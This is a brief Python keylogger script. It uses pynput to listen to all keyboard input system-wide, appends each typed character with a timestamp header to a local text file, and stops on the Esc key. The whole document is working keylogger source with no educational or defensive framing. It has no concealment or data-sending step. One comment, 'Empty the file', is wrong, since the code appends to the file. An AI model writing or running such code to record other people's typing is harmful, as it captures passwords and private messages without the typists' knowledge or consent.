from pynput import keyboard
import datetime

# Empty the file
with open("./file.txt", "a") as file:
    current_datetime = datetime\
                        .datetime\
                        .now()\
                        .strftime("%d/%b/%Y, %I:%M %p")
    file.write(f"\n\n{current_datetime}\n")


def on_press(key):
        try:
            with open("./file.txt", "a", encoding="UTF-8") as output_file:
                if key == keyboard.Key.space:
                    output_file.write(" ")
                else:
                    output_file.write(key.char)
        except AttributeError:
            if key == keyboard.Key.esc:
                # Stop listener
                return False

# Collect events until released
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()